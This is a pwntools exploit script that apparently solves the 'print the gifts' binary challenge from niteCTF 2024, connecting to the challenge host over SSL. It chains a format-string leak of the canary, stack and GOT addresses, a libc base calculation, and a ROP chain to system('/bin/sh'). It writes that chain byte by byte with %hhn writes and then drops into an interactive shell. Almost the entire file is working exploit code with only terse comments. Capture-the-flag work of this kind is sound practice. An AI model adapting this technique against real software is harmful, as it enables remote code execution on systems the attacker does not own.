from pwn import *
elf = ELF('./chall')
libc_path = 'libc.so.6'
#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc_path)

r = elf.process()

host = 'print-the-gifts.chals.nitectf2024.live'
#host ='localhost'
port = 1337

# Establish a remote connection with SSL
r = remote(host, port,ssl=True)

#gdb.attach(r,"""
#    break main        
#""")

scanf_got_ = elf.got['__isoc99_scanf']
main_ = elf.symbols['main']
print(hex(scanf_got_))
print(hex(main_))
scanf_libc_ = libc.symbols['__isoc99_scanf']
system_libc_ = libc.symbols['system']

print(r.recv())
payload = b'%p,'*30
r.sendline(payload)
# arg 0 is rsp-0x1B0 on local, wrong on the server, change to arg 26 instead
# arg 7 is the input
# arg 20 is the canary
# arg 24 is entry of main 
# arg 26 leak stack, 
# leak main address

ret = r.recv().decode("utf-8")
print(ret)
print(len(ret))
#rsp = int(ret.split(',')[0].split(' ')[4],16)+0x1B0
stack_offset = 0x7ffe835369e8-0x7ffe83536850
rsp = int(ret.split(',')[26],16) - stack_offset
main = int(ret.split(',')[24],16)
canary = int(ret.split(',')[20],16)
stack_leak = int()
ret_addr = rsp + 0x88

print(hex(rsp))
print(hex(main))
print(hex(canary))
print(hex(ret_addr))
scanf_got = main-main_+scanf_got_
print(f"scanf got = {hex(scanf_got)}")

r.sendline(b'y')

print(r.recv().decode("utf-8"))
#leak scanf address

payload = b'%9$s,AA\x00'
payload += p64(scanf_got)
r.sendline(payload)
r.recvuntil("you a ")
ret = r.recv()
scanf_libc = int.from_bytes(ret[:6],byteorder='little')
print(f"leaked scanf libc address: {hex(scanf_libc)}")

#build rop and overwrite return address

libc_offset = scanf_libc - scanf_libc_
system_libc =  system_libc_ + libc_offset
libc_rop = ROP(libc)
pop_rdi_ret = libc_rop.find_gadget(['pop rdi','ret'])[0] + libc_offset
ret = libc_rop.find_gadget(['ret'])[0] + libc_offset
bin_sh = next(libc.search(b"/bin/sh")) + libc_offset
rop_chain = p64(pop_rdi_ret)
rop_chain += p64(bin_sh)
rop_chain += p64(ret)
rop_chain += p64(system_libc)

print(rop_chain)
print(f"ret_addr = {hex(ret_addr)}; pop_rdi_ret = {hex(pop_rdi_ret)}")

inx = 0
print(f"size of rop_chain: {len(rop_chain)}")
for byte in rop_chain:
    #print(f"inx of {inx}")
    if byte==0:
        inx = inx+1
        continue
    r.sendline(b'y')
    #print(r.recv())
    r.recv()
    #print(f"byte = {byte}")
    payload = b'%'
    payload += str(byte).encode('utf-8')
    payload += b'c%10$hhn'
    payload += b'A'*(8-(len(payload)%8))
    payload += p64(ret_addr+inx)
    inx=inx+1
    #print(payload)
    
    r.sendline(payload)
    r.recv()

print(f"Inx = {inx}")
#trigger rop
r.sendline(b'n')

r.interactive()
print(r.recv())
print(r.recv())

print(r.recv())
print(r.recv())